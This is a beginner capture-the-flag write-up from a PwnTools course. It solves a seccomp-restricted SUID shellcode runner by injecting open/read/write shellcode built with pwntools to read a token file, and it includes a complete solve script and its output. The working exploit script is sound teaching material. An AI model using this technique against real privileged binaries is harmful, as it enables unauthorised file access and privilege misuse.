# Writeup: Shellcode Runner Challenge
## 1. Challenge:
The **Shellcode Runner** challenge requires exploiting a vulnerable binary located at `/opt/shellcode_runner`. The goal is to read a token file at `/home/token-user/token.txt`. However, there are restrictions: the binary has seccomp rules enabled, blocking the `execve` syscall, meaning we can't spawn a shell. 
Additionally, the binary likely has SUID (Set User ID) permissions, which means that when executed, it runs with the privileges of the binary's owner (in this case, a user with access to the token file). This allows us to read the file even though our current user might not have direct permissions to do so.
- **Source:** Immersive Labs PwnTools course
- **Difficulty:** Beginner
## 2. Analysis:
The provided skeleton script includes basic logic to interact with the vulnerable binary. The key information here is the presence of seccomp filters that block the use of the `execve` syscall, making it impossible to spawn a shell. However, the seccomp rules still allow the use of syscalls such as `open`, `read`, and `write`, which suggests that the challenge can be solved by directly reading the token file and printing its contents to standard output.
The binary likely follows a typical flow for shellcode execution:
- It waits for a payload (shellcode) to be injected.
- The injected shellcode is executed within the binary with elevated permissions, due to the SUID setting.
Our goal is to craft shellcode that:
1. Opens the file `/home/token-user/token.txt`.
2. Reads the contents of the file.
3. Writes the contents to standard output.
## 3. Theory:
To solve this challenge, we must use the `open`, `read`, and `write` syscalls. Here's a brief overview of each:
- **sys_open**: Used to open files. It takes the file path as an argument and returns a file descriptor (FD).
- **sys_read**: Used to read data from a file. It takes the file descriptor, a buffer to store the data, and the number of bytes to read.
- **sys_write**: Writes data to a file descriptor. In our case, we write to `stdout` (file descriptor 1).
The **`pwn`** library's **shellcraft** module provides these syscall templates, making it easier to generate shellcode for this purpose. The shellcode should open the token file, read its contents, and then output the result.
## 4. Solution:
The key to solving this challenge was recognizing that while `execve` is blocked, file operations are not. To attempt a solution:
1. We used the `pwn.shellcraft.open` function to generate shellcode that opens the file `/home/token-user/token.txt`.
2. Next, we used `pwn.shellcraft.read` to read the file contents. Since we don't know the exact length of the file, we can read an arbitrary number of bytes (e.g., 100 bytes).
3. Finally, we used `pwn.shellcraft.write` to print the contents of the file to standard output.
By injecting this shellcode into the binary, it runs with elevated privileges, allowing us to access the token file, and successfully outputs the token.
## 5. How to avoid:
The vulnerability here arises from the ability to execute arbitrary shellcode within the binary. This could have been prevented by:
- **Stricter seccomp filters**: Expanding the seccomp rules to block other syscalls like `open`, `read`, and `write` would mitigate this vulnerability.
- **Disabling direct shellcode execution**: Instead of allowing user-provided shellcode to be executed, the binary could have been compiled with protections such as **Address Space Layout Randomization (ASLR)**, **Non-Executable (NX) stack**, and **Control Flow Integrity (CFI)**.
## 6. Full solution:
```python
from pwn import *
context.log_level = "error"
context.binary = "/opt/shellcode_runner"
context.arch = 'amd64'
p = process("/opt/shellcode_runner")
p.clean()
# Craft shellcode to open, read, and write the token file
shellcode = shellcraft.open("/home/token-user/token.txt")
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
# Convert shellcode to byte payload
payload = asm(shellcode)
print("Payload", payload)
# Send the payload
p.sendline(payload)
p.recvline()
# Get and print the token
print(f"Token: {p.recvline().decode('utf-8').strip()}")
```
### Output:
```bash
iml-user@pwntools-ep-5:~/Desktop/lab-files$ python3 solve.py
Payload: b'hyu\x01\x01\x814$\x01\x01H\xb8/token.tPH\xb8ken-userPH\xb8/h\
ome/toPH\x89\xe7\x1dZl\xf6j\x02X\x0f\x05H\x89\xc7l\xc0jdZH\x89\xe6\x0f\x05j\x01\
jdZH\x89\xe6j\x01X\x0f\x05'
Token: f5fc3f
```
